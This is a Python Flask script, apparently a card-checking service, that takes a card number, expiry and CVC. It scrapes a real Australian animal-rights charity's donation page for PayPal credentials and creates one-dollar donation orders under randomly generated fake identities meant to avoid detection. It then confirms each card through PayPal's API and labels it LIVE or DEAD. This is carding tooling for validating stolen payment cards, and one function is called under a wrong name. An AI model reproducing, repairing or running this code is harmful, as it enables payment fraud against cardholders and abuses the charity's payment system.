# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
import traceback
from flask import Flask, request, jsonify

app = Flask(__name__)

def generate_dynamic_identity():
    """Generates a high-entropy identity to prevent session-based flagging."""
    domains = ["mail.in", "gmail.in", "outlook.in", "proton.in", "zoho.in"]
    # Increased entropy for the prefix to avoid spam-filter signatures
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
    return {
        "first": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
        "last": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
        "email": f"{prefix}@{random.choice(domains)}"
    }

@app.route('/check', methods=['GET'])
def check_card():
    # Primary input vector: /check?cc=number|mm|yy|cvc
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "ERROR", "msg": "MALFORMED_PAYLOAD"}), 400

    try:
        # Standardize card metadata
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'Accept': 'application/json'
        })

        # PHASE 1: Configuration Extraction (Systemic approach)
        # Bypasses json.loads() for non-JSON JS objects
        init_html = session.get('https://animalrights.org.au/donate-now/').text
        form_url_match = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html)
        if not form_url_match:
            return jsonify({"status": "ERROR", "msg": "TARGET_UNREACHABLE"}), 500
            
        form_url = form_url_match.group(1).replace('&#038;', '&')
        form_html = session.get(form_url).text
        
        # Capture stable configuration identifiers
        try:
            client_id = re.search(r'["\']clientId["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
            form_id = re.search(r'["\']donationFormId["\']\s*:\s*(\d+)', form_html).group(1)
            nonce = re.search(r'["\']donationFormNonce["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        except (AttributeError, IndexError):
            return jsonify({"status": "ERROR", "msg": "PARSING_FAILED"}), 500

        # PHASE 2: OAuth2 Scope Negotiation
        # Requesting a Bearer token via the documented v1 OAuth2 endpoint
        auth_header = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post(
            'https://www.paypal.com/v1/oauth2/token',
            headers={'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'},
            data='grant_type=client_credentials'
        )
        token_res.raise_for_status() # HTTP state validation
        access_token = token_res.json().get('access_token')

        # PHASE 3: State-Bound Order Creation
        identity = generate_random_identity()
        order_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': form_id,
            'give-form-hash': nonce,
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': identity['first'],
            'give_last': identity['last'],
            'give_email': identity['email'],
            'give-cs-form-currency': 'AUD',
        }
        
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=order_payload)
        order_res.raise_for_status()
        order_data = order_res.json()
        
        if not order_data.get('success'):
            return jsonify({"status": "DEAD", "msg": "GATEWAY_REJECTED", "raw": order_data}), 200
            
        order_id = order_data['data']['id']

        # PHASE 4: Payment Source Confirmation (The Validation)
        # Validating the transition to 'APPROVED' state
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        )
        
        confirm_data = confirm_res.json()

        # PHASE 5: Engineering-Grade Response Mapping
        # Combines HTTP status with documented state fields
        if confirm_res.status_code == 200 and confirm_data.get('status') == 'APPROVED':
            return jsonify({
                "status": "LIVE",
                "card": cc_param,
                "msg": "APPROVED",
                "dev": "@xoxhunterxd"
            })
        else:
            # Deterministic error mapping from API issue codes
            error_msg = confirm_data.get('details', [{}])[0].get('issue', 'DECLINED')
            return jsonify({
                "status": "DEAD",
                "card": cc_param,
                "msg": error_msg,
                "dev": "@xoxhunterxd"
            })

    except Exception as e:
        # Exposing full traceback for deterministic debugging
        return jsonify({
            "status": "EXCEPTION",
            "msg": str(e),
            "trace": traceback.format_exc(),
            "dev": "@xoxhunterxd"
        }), 500

application = app
